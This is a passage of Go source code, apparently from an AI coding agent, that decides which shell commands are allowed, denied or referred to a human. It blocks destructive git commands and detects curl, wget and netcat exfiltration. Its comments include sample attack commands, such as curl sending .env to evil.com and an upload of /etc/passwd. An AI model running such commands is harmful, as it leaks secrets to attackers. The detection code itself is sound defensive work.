package agent

import (
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"unicode"

	"github.com/u007/ocode/internal/config"
	"github.com/u007/ocode/internal/debuglog"
	"github.com/u007/ocode/internal/paths"
	"github.com/u007/ocode/internal/pathscope"
	"github.com/u007/ocode/internal/shell/sandbox"
	"github.com/u007/ocode/internal/tool"
)

type PermissionLevel string

const (
	PermissionAllow PermissionLevel = "allow"
	PermissionDeny  PermissionLevel = "deny"
	PermissionAsk   PermissionLevel = "ask"
)

type PermissionMode string

const (
	PermissionModeNormal PermissionMode = "normal"
	PermissionModeYOLO   PermissionMode = "yolo"
	PermissionModeLocked PermissionMode = "locked"
	// PermissionModeSandbox runs bash without prompts but confines OS-level
	// writes to the classified allowed roots (write-integrity only: reads,
	// exec, and network egress stay open). It never outlives the session —
	// the persist path clamps it back to normal.
	PermissionModeSandbox PermissionMode = "sandbox"
)

// sandboxSupported reports whether this OS has a real confinement backend.
// Production value is sandbox.Supported(); it is a package var (not called
// inline) so cross-platform tests can simulate an unsupported OS and then
// restore the original.
var sandboxSupported = sandbox.Supported

// SandboxSupported exposes the platform capability to status producers (TUI,
// web server) through the same seam Decide uses, so tests can flip it
// globally and every consumer reflects the simulation.
func SandboxSupported() bool { return sandboxSupported() }

// EffectivePermissionBehavior describes what a permission mode actually does
// on this OS. For sandbox: "confined" (real backend), "degraded_normal"
// (Windows: prompts like normal), plain mode name otherwise. Exposed in the
// permission status shape so the UI can surface the Windows degrade honestly.
func EffectivePermissionBehavior(mode PermissionMode) string {
	switch mode {
	case PermissionModeSandbox:
		if sandboxSupported() {
			return "confined"
		}
		return "degraded_normal"
	default:
		return string(mode)
	}
}

type PermissionScope string

const (
	PermissionScopeTool       PermissionScope = "tool"
	PermissionScopeBashPrefix PermissionScope = "bash_prefix"
)

type PermissionRequest struct {
	ToolName   string          `json:"tool_name"`
	Args       json.RawMessage `json:"args,omitempty"`
	Command    string          `json:"command,omitempty"`
	Prefix     string          `json:"prefix,omitempty"`
	Scope      PermissionScope `json:"scope"`
	Rule       string          `json:"rule"`
	DenyReason string          `json:"deny_reason,omitempty"`
	// ModelUnavailable is set instead of DenyReason when the auto-permission
	// model was never actually consulted (none configured, local server not
	// healthy, client/transport failure). The human prompt surfaces it as a
	// neutral notice: presenting an infrastructure failure as a safety verdict
	// tells the user their command was judged dangerous when nothing judged it.
	ModelUnavailable string `json:"model_unavailable,omitempty"`
	// Summary carries a short model-generated explanation for the request that
	// the human permission prompt can surface alongside any deny reason. It is
	// optional and only populated when the auto-permission flow has one.
	Summary string `json:"summary,omitempty"`
	// OutOfScopePath is the absolute target path that puts a bash command outside
	// the allowed roots (a cd target, redirection, env-var path, or path arg). It
	// is carried so the human prompt can offer to persist that root to
	// extra_allowed_paths instead of a useless bash-prefix/tool rule, and so
	// verifyAutoGrant refuses to silently auto-grant an out-of-scope command.
	OutOfScopePath string `json:"out_of_scope_path,omitempty"`
}

type PermissionDecision struct {
	Level   PermissionLevel
	Request *PermissionRequest
	// HardDeny marks a Deny that must never be reconsidered by the LLM
	// auto-permission judge (hard-blocked commands, /ban-listed bash
	// prefixes). Unlike other Deny decisions, these are not soft hints —
	// they cannot be overridden even when auto-permission is enabled.
	HardDeny bool
}

// PermissionResponse is returned by an interactive permission callback. Level
// answers the current request. PersistRule/PersistTool additionally tell the
// agent handling the request to update its own PermissionManager, so an
// "always allow" answer applies immediately inside the currently running
// sub-agent as well as wherever the UI persists the setting.
type PermissionResponse struct {
	Level       PermissionLevel
	PersistRule bool
	PersistTool bool
}

type pathPatternEntry struct {
	pattern string
	level   PermissionLevel
}

type PermissionManager struct {
	mode                  PermissionMode
	rules                 map[string]PermissionLevel
	userConfirmedRules    map[string]bool // tracks explicit "always allow" decisions
	patterns              []patternRule
	pathPatterns          map[string][]pathPatternEntry // toolName → path-glob patterns
	bashPrefixes          map[string]PermissionLevel
	bashAutoAllow         map[string]bool
	bashPrefixModes       map[string]string
	workDir               string
	webfetchDomains       map[string]PermissionLevel
	autoPermissionEnabled bool
	autoGrants            []config.AutoGrant
	claudeBashAllow       []string
	claudeBashDeny        []string
	claudeBashAsk         []string
	claudeBareDeny        map[string]bool
	claudeBareAsk         map[string]bool
	// sessionID tags this manager's debug-log entries with the owning
	// agent's session (set via Agent.SetSessionID). Empty means untagged
	// (process-global) — see emitDebug.
	sessionID string
}

// emitDebug appends a debug-log entry tagged with the owning agent's
// session id, or falls back to the process-global sink when untagged (TUI,
// or a PermissionManager built outside a session-scoped Agent).
func (pm *PermissionManager) emitDebug(kind, msg string) {
	if pm == nil || pm.sessionID == "" {
		emitDebug(kind, msg)
		return
	}
	debuglog.Log.Append(debuglog.Entry{Kind: debuglog.EntryKind(kind), Message: msg, SessionID: pm.sessionID})
}

type patternRule struct {
	pattern string
	level   PermissionLevel
}

const bashInRootPersistPrefix = "__inroot__:"

const (
	bashPrefixModeReadOnly = "read_only"
	bashPrefixModeMutating = "mutating"
	bashPrefixModeNever    = "never_auto"
)

var bashAutoAllowPrefixes = buildBashAutoAllowPrefixes(runtime.GOOS)
var bashAutoAllowDefaultModes = buildBashAutoAllowDefaultModes(runtime.GOOS)

var bashAlwaysAllow = buildBashAlwaysAllow(runtime.GOOS)

// bashSubcommandAllow maps "<prefix> <subcommand>" (and optionally three-word
// "<prefix> <sub1> <sub2>") strings to true for subcommand-pinned auto-allow.
// Use only for subcommands that are read-only OR project-trusted (operate on
// the working tree but don't reach outside it without an explicit path arg).
//
// Entries here intentionally do NOT path-scope further — a subcommand listed
// here is allowed regardless of args. Do not add subcommands that take an
// arbitrary path and write to it (e.g. `git apply`, `git checkout --`).
var bashSubcommandAllow = map[string]bool{
	// git — read-only subcommands only (no push/reset/checkout/clean/apply).
	// NOTE: "git -c <key>=<value>" wrappers are NOT auto-allowed via the code
	// allowlist — they are evaluated by the auto-permission LLM (see
	// BundledAutoPermissionPromptBody) based on the underlying subcommand's
	// read-only nature. Dangerous -c keys are marked harmful via
	// isDangerousGitConfigKey / hasDangerousGitConfig.
	"git status":       true,
	"git diff":         true,
	"git log":          true,
	"git show":         true,
	"git blame":        true,
	"git describe":     true,
	"git rev-parse":    true,
	"git rev-list":     true,
	"git ls-files":     true,
	"git ls-tree":      true,
	"git ls-remote":    true,
	"git reflog":       true,
	"git shortlog":     true,
	"git cat-file":     true,
	"git check-ignore": true,
	"git grep":         true,
	"git name-rev":     true,
	"git for-each-ref": true,
	// Three-word stash inspection forms — read-only, and paired with the
	// isReadOnlyGitStashForm exclusion in IsHarmfulBashCommand (which would
	// otherwise ASK the whole "git stash" family before this allowlist is
	// reached). The matching always-ALLOW lines live in
	// config.BundledAutoPermissionPromptBody; keep the three in sync.
	"git stash list": true,
	"git stash show": true,
	// Intentionally NOT in the list: branch, tag, remote, stash (except the
	// two read-only forms above), worktree,
	// submodule, notes, config, fetch, pull, push,
	// reset, checkout, clean, apply, am, cherry-pick, rebase, revert, restore,
	// switch, merge, init, add, commit. Some of these are read-only without
	// args but become destructive with flags. Require explicit user approval.
	// gh CLI — viewing only (intentionally omits `gh api` which can POST)
	"gh pr":       true,
	"gh issue":    true,
	"gh run":      true,
	"gh repo":     true,
	"gh auth":     true,
	"gh release":  true,
	"gh workflow": true,
	"gh label":    true,
	"gh search":   true,
	"gh ruleset":  true,
	// Go toolchain
	"go build":    true,
	"go test":     true,
	"go run":      true,
	"go vet":      true,
	"go fmt":      true,
	"go list":     true,
	"go doc":      true,
	"go env":      true,
	"go version":  true,
	"go mod":      true,
	"go tool":     true,
	"go generate": true,
	"go work":     true,
	"gofmt":       true,
	"goimports":   true,
	// Rust toolchain
	"cargo check":    true,
	"cargo build":    true,
	"cargo test":     true,
	"cargo clippy":   true,
	"cargo fmt":      true,
	"cargo doc":      true,
	"cargo tree":     true,
	"cargo metadata": true,
	"cargo version":  true,
	"cargo run":      true,
	// Python / TS type-checkers / formatters (project-scoped tools)
	"pytest":       true,
	"ruff":         true,
	"mypy":         true,
	"basedpyright": true,
	"tsc":          true,
	"tsgo":         true,
	"eslint":       true,
	"prettier":     true,
	"biome":        true,
	"vitest":       true,
	// Docker — read-only inspection
	"docker ps":             true,
	"docker images":         true,
	"docker logs":           true,
	"docker inspect":        true,
	"docker version":        true,
	"docker info":           true,
	"docker history":        true,
	"docker port":           true,
	"docker top":            true,
	"docker stats":          true,
	"docker compose ps":     true,
	"docker compose logs":   true,
	"docker compose config": true,
	"docker compose top":    true,
	"docker compose port":   true,
	"docker compose images": true,
	"docker compose ls":     true,
	// Node package managers — project-trusted script runners + read commands.
	// Same trust model as `make`: scripts can do anything, but they live in
	// the project's manifest.
	"npm run":       true,
	"npm test":      true,
	"npm list":      true,
	"npm ls":        true,
	"npm outdated":  true,
	"npm view":      true,
	"npm info":      true,
	"npm audit":     true,
	"npm fund":      true,
	"npm doctor":    true,
	"npm ping":      true,
	"npm search":    true,
	"pnpm run":      true,
	"pnpm test":     true,
	"pnpm list":     true,
	"pnpm ls":       true,
	"pnpm outdated": true,
	"pnpm view":     true,
	"pnpm info":     true,
	"pnpm audit":    true,
	"pnpm why":      true,
	"pnpm doctor":   true,
	"yarn run":      true,
	"yarn test":     true,
	"yarn list":     true,
	"yarn outdated": true,
	"yarn info":     true,
	"yarn audit":    true,
	"yarn why":      true,
	"bun run":       true,
	"bun test":      true,
	// Vite+ — project-trusted commands, same trust model as `npm run`/`make`:
	// tasks live in the project manifest. Read-only queries plus the Develop
	// task group (dev/check/lint/fmt/test/build/preview) and `run`.
	// Bare `vp`, dependency mutations (install/add/remove/update/...),
	// toolchain/env management, scaffolding, and self-modify
	// (upgrade/implode) are NOT allowed. `vp node` runs arbitrary scripts
	// (Ask). `vp exec`/`vp dlx` resolve through runnerInvokedSafeTool like
	// `pnpm exec`/`npx`, and standalone `vpr` is `vp run` (path-guarded below).
	"vp outdated":  true,
	"vp list":      true,
	"vp ls":        true,
	"vp why":       true,
	"vp explain":   true,
	"vp info":      true,
	"vp view":      true,
	"vp show":      true,
	"vp help":      true,
	"vp --version": true,
	"vp -V":        true,
	"vp run":       true,
	"vp test":      true,
	"vp check":     true,
	"vp lint":      true,
	"vp fmt":       true,
	"vp build":     true,
	"vp dev":       true,
	"vp preview":   true,
	"vpr":          true,
	// make: project-trusted, all targets (same risk model as before).
	"make": true,
}

// findUnsafeFlags are flags on `find` that can execute subprocesses or delete
// files. Any of these makes the command non-auto-allowable.
var findUnsafeFlags = map[string]bool{
	"-exec": true, "-execdir": true, "-ok": true, "-okdir": true,
	"-delete": true, "-fprint": true, "-fprintf": true,
	"-fprint0": true, "-fls": true,
}

// fdUnsafeFlags are flags on `fd` that can execute subprocesses.
var fdUnsafeFlags = map[string]bool{
	"-x": true, "--exec": true, "-X": true, "--exec-batch": true,
}

// gitGlobalArgsWithValue are git global options that take a separate value
// argument. They must be stripped along with that value when locating the
// real subcommand (e.g. `git -c k=v -C /tmp status` → subcommand is `status`).
// Note: "-c" is intentionally NOT included here — "git -c <key>=<value>"
// wrappers are NOT transparently stripped for the code allowlist/deny lists.
// They are routed to the auto-permission LLM which evaluates the underlying
// subcommand's read-only nature (see BundledAutoPermissionPromptBody).
var gitGlobalArgsWithValue = map[string]bool{
	"-C":        true,
	"--git-dir": true, "--work-tree": true, "--namespace": true, "--super-prefix": true,
}

// gitSubcommandIndex returns the index in fields of the git subcommand,
// transparently skipping global wrappers like `git -C /tmp`, `git --no-pager`,
// `git --bare`, etc. Returns -1 if no subcommand can be found (e.g. bare
// `git` or `git -c k=v` with no following word). "-c" wrappers are NOT
// skipped — they are handled by the LLM prompt, not the code allowlist.
var gitRecognizedGlobalFlags = map[string]bool{
	"--paginate": true, "--no-pager": true, "--no-replace-objects": true,
	"--bare": true, "--no-optional-locks": true, "--literal-pathspecs": true,
	"--glob-pathspecs": true, "--noglob-pathspecs": true, "--icase-pathspecs": true,
	"-p": true,
}

func gitSubcommandIndex(fields []string) int {
	if len(fields) == 0 || fields[0] != "git" {
		return -1
	}
	i := 1
	for i < len(fields) {
		f := fields[i]
		// "-c" wrappers are NOT transparent for the code allowlist — they must
		// be evaluated by the LLM. Returning -1 prevents auto-allow via
		// matchSubcommandAllow. Dangerous keys are handled separately in
		// IsHarmfulBashCommand via hasDangerousGitConfig.
		if f == "-c" || (strings.HasPrefix(f, "-c") && len(f) > 2) {
			return -1
		}
		if gitGlobalArgsWithValue[f] {
			// Takes a value: skip flag + value (if present).
			if i+1 < len(fields) {
				i += 2
			} else {
				i++
			}
			continue
		}
		if strings.HasPrefix(f, "--git-dir=") || strings.HasPrefix(f, "--work-tree=") ||
			strings.HasPrefix(f, "--namespace=") || strings.HasPrefix(f, "--super-prefix=") {
			i++
			continue
		}
		if f == "--exec-path" {
			// --exec-path optionally takes a value; consume it if the next token
			// does not look like a flag or subcommand.
			if i+1 < len(fields) && !strings.HasPrefix(fields[i+1], "-") {
				i += 2
			} else {
				i++
			}
			continue
		}
		if strings.HasPrefix(f, "--exec-path=") {
			i++
			continue
		}
		if gitRecognizedGlobalFlags[f] {
			i++
			continue
		}
		if strings.HasPrefix(f, "-") {
			// Unknown dashed flag before subcommand — fail closed. Do not
			// infer subcommand after untrusted option/value.
			return -1
		}
		// First non-flag token after `git` and its global options → subcommand.
		return i
	}
	return -1
}

// isDangerousGitConfigKey reports whether a git -c key can enable code
// execution or credential/path hijacking. These must never be auto-allowed
// and are marked harmful so they require human approval.
func isDangerousGitConfigKey(key string) bool {
	k := strings.ToLower(strings.TrimSpace(key))
	if k == "" {
		return false
	}
	if strings.HasPrefix(k, "protocol.") && strings.HasSuffix(k, ".allow") {
		return true
	}
	if k == "core.sshcommand" || k == "core.pager" || k == "core.editor" || k == "core.hookspath" {
		return true
	}
	if strings.HasPrefix(k, "filter.") {
		return true
	}
	if strings.HasPrefix(k, "url.") && strings.HasSuffix(k, ".insteadof") {
		return true
	}
	if k == "credential.helper" || strings.HasPrefix(k, "credential.") {
		return true
	}
	if strings.HasPrefix(k, "pager.") {
		// A pager is an executed command (when git's stdout is a terminal).
		return true
	}
	if k == "gpg.program" {
		// Executed by git verify-commit/verify-tag.
		return true
	}
	return false
}

// hasDangerousGitConfig scans git fields for "-c <key>=<value>" wrappers
// whose key is dangerous per isDangerousGitConfigKey. Handles both
// "-c key=value" and glued "-ckey=value" forms.
func hasDangerousGitConfig(fields []string) bool {
	for i := 1; i < len(fields); i++ {
		f := fields[i]
		var kv string
		if f == "-c" && i+1 < len(fields) {
			kv = fields[i+1]
			i++
		} else if strings.HasPrefix(f, "-c") && len(f) > 2 {
			kv = strings.TrimPrefix(f, "-c")
		} else {
			continue
		}
		key := kv
		if idx := strings.Index(kv, "="); idx != -1 {
			key = kv[:idx]
		}
		if isDangerousGitConfigKey(key) {
			return true
		}
	}
	return false
}

// gitSubcommandIndexSkippingC returns the index of the git subcommand while
// transparently skipping "-c" wrappers — used only for harmful detection so
// "git -c k=v reset --hard" is still recognized as harmful.
func gitSubcommandIndexSkippingC(fields []string) int {
	if len(fields) == 0 || fields[0] != "git" {
		return -1
	}
	i := 1
	for i < len(fields) {
		f := fields[i]
		if f == "-c" {
			if i+1 < len(fields) {
				i += 2
			} else {
				i++
			}
			continue
		}
		if strings.HasPrefix(f, "-c") && len(f) > 2 {
			i++
			continue
		}
		if gitGlobalArgsWithValue[f] {
			if i+1 < len(fields) {
				i += 2
			} else {
				i++
			}
			continue
		}
		if strings.HasPrefix(f, "--git-dir=") || strings.HasPrefix(f, "--work-tree=") ||
			strings.HasPrefix(f, "--namespace=") || strings.HasPrefix(f, "--super-prefix=") {
			i++
			continue
		}
		if f == "--exec-path" {
			if i+1 < len(fields) && !strings.HasPrefix(fields[i+1], "-") {
				i += 2
			} else {
				i++
			}
			continue
		}
		if strings.HasPrefix(f, "--exec-path=") {
			i++
			continue
		}
		if gitRecognizedGlobalFlags[f] {
			i++
			continue
		}
		if strings.HasPrefix(f, "-") {
			return -1
		}
		return i
	}
	return -1
}

// isReadOnlyGitStashForm reports whether the words after "git stash" are one
// of the read-only inspection forms: "list" (optionally with log-formatting
// options) or "show" (optionally -u/--include-untracked/--only/-p and a stash
// ref). Every other form — pop, apply, drop, clear, branch, save, store,
// create, or no subcommand at all (bare "git stash" defaults to push) —
// mutates or discards stash state and stays harmful. The companion
// "git stash list"/"git stash show" entries in bashSubcommandAllow provide
// the code-level auto-allow that this exclusion in IsHarmfulBashCommand
// unlocks.
func isReadOnlyGitStashForm(args []string) bool {
	if len(args) == 0 {
		return false
	}
	switch args[0] {
	case "list", "show":
		return true
	default:
		return false
	}
}

// gitConfigWriteFlagForms are legacy `git config` flags that write config.
var gitConfigWriteFlagForms = map[string]bool{
	"--add": true, "--unset": true, "--unset-all": true, "--replace-all": true,
	"--remove-section": true, "--rename-section": true, "-e": true, "--edit": true,
}

// gitConfigReadFlagForms are legacy `git config` flags whose following
// arguments belong to a read action (so they must not be counted as the
// two-positional "<name> <value>" write form).
var gitConfigReadFlagForms = map[string]bool{
	"--get": true, "--get-all": true, "--get-regexp": true, "--list": true, "-l": true,
	"--get-urlmatch": true, "--get-color": true, "--get-colorbool": true,
}

// gitConfigValueFlags are `git config` options that take a separate value
// argument; the flag and its value are skipped when counting positionals.
// Unknown dashed flags are NOT skipped — an unknown flag's value would then
// be miscounted as a positional, which fails CLOSED (a read misclassified as
// a write costs a human approval; a write misclassified as a read would not).
var gitConfigValueFlags = map[string]bool{
	"--file": true, "-f": true, "--blob": true, "--type": true,
	"--fixed-value": true, "--comment": true,
}

// gitConfigWriteSubcommands are the modern (git >= 2.46) `git config`
// subcommand forms that write config. "get"/"list" are the read forms.
var gitConfigWriteSubcommands = map[string]bool{
	"set": true, "unset": true, "unset-all": true, "replace-all": true,
	"remove-section": true, "rename-section": true, "edit": true,
}

// gitConfigWriteArgs reports whether the arguments after `git config` invoke
// a config-writing form. This is the code-side backstop for the gatekeeper
// prose: config reads stay judge-mediated (the prose allowlists them), but a
// config WRITE must reach the human, because the same security-sensitive
// keys the -c scanner treats as dangerous can be planted persistently via
// `git config <key> <value>` or the modern `git config set` form (e.g.
// "git config core.sshCommand <payload>"), after which code-auto-allowed
// read-only commands like "git ls-remote" execute them. Classification is
// conservative: anything that is not clearly a read form is treated as a
// write.
func gitConfigWriteArgs(args []string) bool {
	// Modern subcommand forms: "git config set <name> <value>", etc.
	if len(args) > 0 && !strings.HasPrefix(args[0], "-") {
		if gitConfigWriteSubcommands[args[0]] {
			return true
		}
		if args[0] == "get" || args[0] == "list" {
			return false
		}
	}
	writeFlag, readFlag := false, false
	positionals := 0
	for i := 0; i < len(args); i++ {
		a := args[i]
		switch {
		case gitConfigWriteFlagForms[a]:
			writeFlag = true
		case gitConfigReadFlagForms[a]:
			readFlag = true
		case gitConfigValueFlags[a]:
			if i+1 < len(args) {
				i++ // consume the flag's value
			}
		case strings.HasPrefix(a, "-"):
			// Boolean or unknown flag: never a positional.
		default:
			positionals++
		}
	}
	if writeFlag {
		return true
	}
	if readFlag {
		return false
	}
	// Legacy positional grammar: "git config <name> <value>" writes; a
	// single positional is the implicit read "git config <name>".
	return positionals >= 2
}

// pathScopedTools are file tools whose decision depends on the target path
// (workdir scope, sensitive paths). Membership must stay in sync with the
// path-returning cases of extractPathFromArgs.
var pathScopedTools = map[string]bool{
	"read": true, "write": true, "edit": true, "delete": true,
	"multiedit": true, "multi_file_edit": true, "replace_lines": true, "glob": true, "grep": true,
	"list": true, "lsp": true, "apply_patch": true, "format": true, "repo_overview": true,
}

// harmfulBashPrefixes are git subcommand prefixes that are inherently
// destructive or risky. Commands matching any of these prefixes
// should never be auto-allowed by the LLM auto-permission layer, and
// cannot be persisted as "always allow" rules.
//
// Each entry is a two-word prefix (e.g. "git revert") that locks the
// whole subcommand family as harmful. Force-flagged single commands
// (e.g. "git push" with --force) are handled separately in
// IsHarmfulBashCommand.
var harmfulBashPrefixes = map[string]bool{
	"git revert":   true, // undo commits (rewrites history)
	"git stash":    true, // stash/unstash (can lose uncommitted changes)
	"git reset":    true, // reset HEAD/index/working-tree
	"git clean":    true, // remove untracked files
	"git checkout": true, // can discard working-tree changes
	"git restore":  true, // can discard working-tree changes
	"git switch":   true, // can discard working-tree changes
}

// harmfulBashForceFlags lists git subcommands that are only harmful
// when a specific force flag is present. The map value is the set of
// flags that make the command harmful.
var harmfulBashForceFlags = map[string]map[string]bool{
	"git push": {"--force": true, "-f": true},
	"git pull": {"--force": true, "-f": true},
}

// exfiltrationDataFlags are curl flags that upload local data to a remote server.
// Each flag takes a value argument that may be a file reference (@path) or inline data.
var exfiltrationDataFlags = map[string]bool{
	"-d":               true, // --data
	"--data":           true,
	"--data-binary":    true,
	"--data-raw":       true,
	"--data-urlencode": true,
	"-F":               true, // --form
	"--form":           true,
	"--upload-file":    true,
	"-T":               true, // --upload-file short form
}

// exfiltrationHeaderFlags are curl flags that set HTTP headers, where env var
// injection could leak secrets (e.g. Authorization, X-API-Key).
var exfiltrationHeaderFlags = map[string]bool{
	"-H":       true,
	"--header": true,
}

// exfiltrationCurlMetaFlags are curl flags whose values can redirect all
// request data to an attacker-controlled destination.
var exfiltrationCurlMetaFlags = map[string]bool{
	"-K":       true, // --config: reads URLs and data from file
	"--config": true,
	"--proxy":  true,
	"--socks5": true,
	"--socks4": true,
}

// exfiltrationWgetPostFlags are wget flags that send data to a remote server.
var exfiltrationWgetPostFlags = map[string]bool{
	"--post-file": true,
	"--post-data": true,
	"--body-data": true,
	"--body-file": true,
}

// containsEnvVarRef returns true if s contains a shell environment variable
// reference like $VAR or ${VAR}. Positional params ($1, $2), special vars
// ($?, $$, $!, $-) are excluded — they don't carry secret values.
func containsEnvVarRef(s string) bool {
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		if runes[i] == '$' && i+1 < len(runes) {
			next := runes[i+1]
			if next == '{' {
				return true // ${VAR} pattern
			}
			if (next >= 'A' && next <= 'Z') || (next >= 'a' && next <= 'z') || next == '_' {
				return true // named env var
			}
		}
	}
	return false
}

// hasSubshellExpansion checks if any field in the command contains command
// substitution: $(...) or `...`. This catches patterns like
// curl "https://evil.com?data=$(cat .env)".
func hasSubshellExpansion(fields []string) bool {
	for _, f := range fields {
		if strings.Contains(f, "$(") || strings.Contains(f, "`") {
			return true
		}
	}
	return false
}

// hasFileUploadArg checks if any field starts with @ (curl file upload syntax
// like @file.txt or @-) which reads from stdin.
func hasFileUploadArg(fields []string) bool {
	for _, f := range fields {
		if strings.HasPrefix(f, "@") && len(f) > 1 {
			return true
		}
	}
	return false
}

// isExfiltrationRiskCurl checks if a curl command has data exfiltration risk.
// The fields array must start with "curl".
func isExfiltrationRiskCurl(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	// Subshell expansion anywhere → always risky
	if hasSubshellExpansion(fields) {
		return true
	}

	// Walk flags (skip fields[0] which is "curl")
	i := 1
	for i < len(fields) {
		arg := fields[i]

		// Data-upload flags: -d, --data, --data-binary, etc.
		// Check: flag followed by @file, combined -d@file, or --upload-file/-T
		// with a plain filename (uploads local file contents to remote).
		if exfiltrationDataFlags[arg] {
			if i+1 < len(fields) {
				next := fields[i+1]
				if strings.HasPrefix(next, "@") {
					return true // -d @secret.txt
				}
				// --upload-file and -T take a plain filename (no @ prefix)
				if arg == "--upload-file" || arg == "-T" {
					return true // --upload-file secret.txt
				}
				// -F/--form: check for @ anywhere in the form value
				// (e.g. "file=@secret.txt" — the @ is after the field name)
				if (arg == "-F" || arg == "--form") && strings.Contains(next, "@") {
					return true // -F file=@secret.txt
				}
			}
			i++
			continue
		}
		// Combined form: -d@file.txt (no space)
		if strings.HasPrefix(arg, "-d@") || strings.HasPrefix(arg, "--data@") {
			return true
		}

		// Header flags: -H, --header with env var ref
		if exfiltrationHeaderFlags[arg] {
			if i+1 < len(fields) && containsEnvVarRef(fields[i+1]) {
				return true // -H "Authorization: $TOKEN"
			}
			i++
			continue
		}

		// Meta flags: --config, --proxy, --socks5 with file/env var
		if exfiltrationCurlMetaFlags[arg] {
			if i+1 < len(fields) {
				next := fields[i+1]
				if strings.HasPrefix(next, "@") || containsEnvVarRef(next) {
					return true
				}
			}
			i++
			continue
		}

		i++
	}

	// Check non-flag args (URL position): env var in URL
	// First non-flag arg is the URL
	foundFlag := false
	for _, f := range fields[1:] {
		if strings.HasPrefix(f, "-") {
			foundFlag = true
			continue
		}
		if !foundFlag || !strings.Contains(f, "://") {
			// First positional arg that looks like a URL
			if containsEnvVarRef(f) {
				return true // curl $URL
			}
			break
		}
	}

	return false
}

// isExfiltrationRiskWget checks if a wget command has data exfiltration risk.
func isExfiltrationRiskWget(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	if hasSubshellExpansion(fields) {
		return true
	}

	i := 1
	for i < len(fields) {
		arg := fields[i]

		// --post-file=<file>, --post-data=<data>, etc. (equals form)
		if strings.HasPrefix(arg, "--post-file=") ||
			strings.HasPrefix(arg, "--post-data=") ||
			strings.HasPrefix(arg, "--body-data=") ||
			strings.HasPrefix(arg, "--body-file=") {
			return true
		}

		// --post-file <file> (space-separated form)
		if exfiltrationWgetPostFlags[arg] {
			if i+1 < len(fields) {
				return true
			}
		}

		// -i <file>: reads URLs from file
		if arg == "-i" && i+1 < len(fields) {
			return true
		}

		i++
	}

	return false
}

// isExfiltrationRiskHTTPie checks if an httpie command has data exfil risk.
// httpie uses positional args: http [OPTIONS] METHOD URL [KEY:VALUE...] [DATA...]
func isExfiltrationRiskHTTPie(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	if hasSubshellExpansion(fields) {
		return true
	}

	hasForm := false
	for _, f := range fields[1:] {
		if f == "--form" || f == "-f" {
			hasForm = true
		}
	}

	// --form with file@ pattern: http --form POST url file@/etc/passwd
	if hasForm {
		for _, f := range fields[1:] {
			if strings.Contains(f, "@") && !strings.HasPrefix(f, "@") {
				return true
			}
		}
	}

	// Positional header values with env vars: http POST url Authorization:"$TOKEN"
	// Headers are Key:Value args, typically after METHOD URL
	for _, f := range fields[2:] {
		if strings.Contains(f, ":") && containsEnvVarRef(f) {
			return true
		}
	}

	// --auth/-a with env var (two-pass since args are positional)
	for i, f := range fields[1:] {
		if f == "--auth" || f == "-a" {
			idx := i + 2 // +1 for fields[0] offset, +1 for next arg
			if idx < len(fields) && containsEnvVarRef(fields[idx]) {
				return true
			}
		}
	}

	return false
}

// isExfiltrationRiskNetcat checks if a netcat/nc command sends data to a remote host.
// Port-scan-only flags (-z, -zv, -zw) are not exfiltration risk — they test
// connectivity without transmitting application data. Data-sending risk is
// flagged when stdin is redirected or no scan-only flag is present.
func isExfiltrationRiskNetcat(fields []string) bool {
	if len(fields) < 2 {
		return false
	}

	// Loopback connections (127.0.0.0/8, ::1, localhost) stay on-host and
	// cannot exfiltrate data off-machine, so they are never harmful — even
	// when sending data (e.g. `nc 127.0.0.1 12143 < file`). Check this before
	// the redirection/scan logic so loopback always wins.
	if netcatHostIsLoopback(fields) {
		return false
	}

	// Check for stdin redirection: nc host port < file
	for _, f := range fields[1:] {
		if f == "<" {
			return true
		}
	}

	// Check for scan-only flags (-z, -zv, -zn, -zw, etc.)
	// If -z is present, it's a port scan — no data sent.
	hasScanFlag := false
	for _, f := range fields[1:] {
		if strings.HasPrefix(f, "-") && !strings.HasPrefix(f, "--") {
			// Short flag group: check each char for 'z'
			for _, ch := range f[1:] {
				if ch == 'z' {
					hasScanFlag = true
					break
				}
			}
		}
		if hasScanFlag {
			break
		}
	}

	if hasScanFlag {
		return false // port scan only — no data exfiltration
	}

	// nc with a non-loopback host+port and no scan flag: can send arbitrary data
	return true
}

// netcatHostIsLoopback reports whether any positional (non-flag, non-port)
// argument of an nc command is a loopback host (127.0.0.0/8, ::1, localhost).
func netcatHostIsLoopback(fields []string) bool {
	for _, f := range fields[1:] {
		if strings.HasPrefix(f, "-") {
			continue // flag, not a host
		}
		if isAllDigits(f) {
			continue // pure port number
		}
		if isLoopbackHost(f) {
			return true
		}
	}
	return false
}

// isLoopbackHost reports whether host is a loopback address.
func isLoopbackHost(host string) bool {
	h := strings.TrimPrefix(host, "[")
	h = strings.TrimSuffix(h, "]")
	switch h {
	case "localhost", "::1":
		return true
	}
	// 127.0.0.0/8 — all loopback per RFC 3330/6598-era conventions
	if strings.HasPrefix(h, "127.") {
		return true
	}
	return false
}

// isAllDigits reports whether s consists only of ASCII digits.
func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// isLoopbackNetcat reports whether command is a netcat (nc/ncat) connection to
// a loopback host. Used by decideSingleCommand to auto-allow local-only
// connections, which cannot exfiltrate data off-machine.
func isLoopbackNetcat(command string) bool {
	fields := splitShellFields(command)
	if len(fields) < 2 {
		return false
	}
	switch fields[0] {
	case "nc", "ncat":
		return netcatHostIsLoopback(fields)
	}
	return false
}

// isLoopbackNetworkCommand reports whether a network-capable bash command
// (curl, wget, httpie) targets a loopback address (127.0.0.0/8, ::1,
// localhost). Loopback connections stay on-host and cannot exfiltrate data
// off-machine, so they are auto-allowed — same rationale as loopback nc.
func isLoopbackNetworkCommand(command string) bool {
	fields := splitShellFields(command)
	if len(fields) < 2 {
		return false
	}
	switch fields[0] {
	case "curl", "wget", "http", "https":
		return subprocessTargetsLocalhost(command)
	}
	return false
}

// isExfiltrationRiskCommand checks if a bash command has data exfiltration
// risk patterns. This covers curl, wget, httpie, and netcat.
func isExfiltrationRiskCommand(command string) bool {
	fields := splitShellFields(command)
	if len(fields) == 0 {
		return false
	}

	switch fields[0] {
	case "curl", "wget", "http", "https":
		// Loopback connections (127.0.0.0/8, ::1, localhost) stay on-host and
